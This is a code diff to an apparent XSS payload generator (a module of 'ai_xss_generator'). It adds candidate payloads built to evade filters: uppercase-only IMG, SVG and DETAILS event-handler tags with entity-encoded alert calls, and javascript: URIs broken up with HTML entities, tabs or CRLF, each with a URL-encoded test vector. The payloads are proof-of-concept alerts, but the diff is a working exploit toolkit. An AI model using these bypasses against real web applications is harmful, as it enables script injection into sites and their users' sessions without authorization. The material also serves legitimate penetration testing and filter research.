@@ -97,6 +97,59 @@ _SPACE_SUBS = [" ", "%09", "%0a", "%0d", "/", "/+/"]
 _ENDS = ["//", ">"]
 
 
+def _html_entity_word(s: str) -> str:
+    return "".join(f"&#{ord(ch)};" for ch in s)
+
+
+def _scheme_entity_uri(expr: str) -> str:
+    return f"{_html_entity_word('javascript:')}{expr}"
+
+
+def _uppercase_safe_html_body_payloads(
+    surviving_chars: frozenset[str],
+    param_name: str,
+) -> list["PayloadCandidate"]:
+    from urllib.parse import quote as url_quote
+    from ai_xss_generator.types import PayloadCandidate
+
+    has_upper = any(ch.isupper() for ch in surviving_chars)
+    has_lower = any(ch.islower() for ch in surviving_chars)
+    if not has_upper or has_lower or "<" not in surviving_chars:
+        return []
+
+    entity_alert = _html_entity_word("alert")
+    candidates = [
+        PayloadCandidate(
+            payload=f"<IMG SRC=x ONERROR={entity_alert}(1)>",
+            title="uppercase-safe img onerror",
+            explanation="Uppercase-safe HTML body payload using numeric entities for alert.",
+            test_vector=f"?{param_name}={url_quote(f'<IMG SRC=x ONERROR={entity_alert}(1)>', safe='')}",
+            tags=["uppercase_safe", "html_body", "img"],
+            target_sink="probe:html_body",
+            risk_score=98,
+        ),
+        PayloadCandidate(
+            payload=f"<SVG ONLOAD={entity_alert}`1`>",
+            title="uppercase-safe svg onload",
+            explanation="Uppercase-safe SVG payload using numeric entities and backtick call syntax.",
+            test_vector=f"?{param_name}={url_quote(f'<SVG ONLOAD={entity_alert}`1`>', safe='')}",
+            tags=["uppercase_safe", "html_body", "svg"],
+            target_sink="probe:html_body",
+            risk_score=96,
+        ),
+        PayloadCandidate(
+            payload="<DETAILS OPEN ONTOGGLE=&#97;&#108;&#101;&#114;&#116;(1)>",
+            title="uppercase-safe details ontoggle",
+            explanation="Uppercase-safe no-interaction details toggle payload.",
+            test_vector=f"?{param_name}={url_quote('<DETAILS OPEN ONTOGGLE=&#97;&#108;&#101;&#114;&#116;(1)>', safe='')}",
+            tags=["uppercase_safe", "html_body", "details"],
+            target_sink="probe:html_body",
+            risk_score=94,
+        ),
+    ]
+    return candidates
+
+
 # ---------------------------------------------------------------------------
 # gen_gen — the combinatorial payload engine
 # ---------------------------------------------------------------------------
@@ -204,6 +257,7 @@ def html_body_payloads(
 
     breaker = ""
     candidates = gen_gen(breaker, surviving_chars)
+    candidates.extend(_uppercase_safe_html_body_payloads(surviving_chars, param_name))
 
     # Annotate test_vector
     for c in candidates:
@@ -421,6 +475,46 @@ def html_attr_url_payloads(
                 tags=["html_attr_url", f"attr:{attr_name}"],
                 target_sink="probe:html_attr_url",
                 risk_score=96,
+            ))
+        for expr in ("alert(1)", "confirm(1)"):
+            candidates.append(PayloadCandidate(
+                payload=_scheme_entity_uri(expr),
+                title=f"entity-encoded javascript scheme → {expr}",
+                explanation=(
+                    "Encodes javascript: as numeric HTML entities so raw-text scheme "
+                    "filters do not match before the browser decodes the href."
+                ),
+                test_vector=f"?{param_name}={url_quote(_scheme_entity_uri(expr), safe='')}",
+                tags=["html_attr_url", "entity_scheme", f"attr:{attr_name}"],
+                target_sink="probe:html_attr_url",
+                risk_score=98,
+            ))
+            candidates.append(PayloadCandidate(
+                payload=f"java\tscript:{expr}",
+                title=f"tab-separated javascript scheme → {expr}",
+                explanation="Breaks the javascript scheme with a tab that browsers strip before URL parsing.",
+                test_vector=f"?{param_name}={url_quote(f'java\\tscript:{expr}', safe='')}",
+                tags=["html_attr_url", "whitespace_scheme", "tab", f"attr:{attr_name}"],
+                target_sink="probe:html_attr_url",
+                risk_score=97,
+            ))
+            candidates.append(PayloadCandidate(
+                payload=f"java&#9;script:{expr}",
+                title=f"entity-tab javascript scheme → {expr}",
+                explanation="Uses an HTML entity tab inside the javascript scheme for href parsing bypasses.",
+                test_vector=f"?{param_name}={url_quote(f'java&#9;script:{expr}', safe='')}",
+                tags=["html_attr_url", "whitespace_scheme", "entity_tab", f"attr:{attr_name}"],
+                target_sink="probe:html_attr_url",
+                risk_score=95,
+            ))
+            candidates.append(PayloadCandidate(
+                payload=f"java\r\nscript:{expr}",
+                title=f"CRLF-separated javascript scheme → {expr}",
+                explanation="Breaks the javascript scheme with CRLF characters that browsers normalize away in href parsing.",
+                test_vector=f"?{param_name}={url_quote(f'java\\r\\nscript:{expr}', safe='')}",
+                tags=["html_attr_url", "whitespace_scheme", "crlf", f"attr:{attr_name}"],
+                target_sink="probe:html_attr_url",
+                risk_score=94,
             ))
         # For src of <script>/<iframe>/<embed> — external URL load
         if attr_name in ("src", "data"):
